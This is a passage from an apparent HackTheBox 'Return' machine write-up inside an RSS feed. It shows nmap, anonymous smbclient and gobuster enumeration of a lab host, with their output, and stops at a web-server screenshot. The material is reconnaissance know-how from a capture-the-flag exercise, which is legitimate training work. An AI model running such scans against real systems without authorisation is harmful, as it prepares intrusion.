+Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+| smb2-time:
+| date: 2023-08-09T18:12:01
+|_ start_date: N/A
+|_clock-skew: 18m01s
+| smb2-security-mode:
+| 3:1:1:
+|_ Message signing enabled and required
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 94.64 seconds
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>smb&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ smbclient -N -L //10.10.11.108
+Anonymous login successful
+Sharename Type Comment
+--------- ---- -------
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.11.108 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>gobuster&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ gobuster dir -u http://10.10.11.108/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url: http://10.10.11.108/
+[+] Method: GET
+[+] Threads: 50
+[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes: 404
+[+] User Agent: gobuster/3.5
+[+] Extensions: php,txt
+[+] Timeout: 10s
+===============================================================
+2023/08/10 15:50:19 Starting gobuster in directory enumeration mode
+===============================================================
+/images (Status: 301) [Size: 150] [--&amp;gt; http://10.10.11.108/images/]
+/index.php (Status: 200) [Size: 28274]
+/Images (Status: 301) [Size: 150] [--&amp;gt; http://10.10.11.108/Images/]
+/Index.php (Status: 200) [Size: 28274]
+/settings.php (Status: 200) [Size: 29090]
+/IMAGES (Status: 301) [Size: 150] [--&amp;gt; http://10.10.11.108/IMAGES/]
+/INDEX.php (Status: 200) [Size: 28274]
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Web Server&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/return/images/1.png">&lt;/p></description></item></channel></rss>
